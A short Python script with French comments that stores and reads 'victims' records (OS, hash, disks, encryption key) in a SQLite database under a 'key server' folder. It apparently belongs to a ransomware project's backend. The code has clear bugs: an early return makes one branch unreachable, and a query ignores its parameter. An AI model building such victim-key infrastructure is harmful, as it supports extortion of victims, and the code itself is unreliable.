import sqlite3
connexion = sqlite3.connect("../serveur_cles/data/victims.sqlite")  #BDD dans le fichie

curseur = connexion.cursor()  #Récupération d'un curseur
list=[]

curseur.executescript("""
INSERT INTO victims(id_victim, os, hash, disks, key) VALUES (1,"linux","iueriur","E:/","257889654123");
""")

#chercher dans la bd
#python
def recup_data_victime(numero, id=None):
    if numero == 1:
        curseur.execute("SELECT * FROM victims")
        resultats = curseur.fetchall()
        for resultat in resultats:
            list.append(resultat)
    return list
    if numero == 2:
        curseur.execute("SELECT * FROM victims WHERE id = id")
        resultats = curseur.fetchall()
    return resultats

print(recup_data_victime(1))
connexion.close()  #Déconnexion


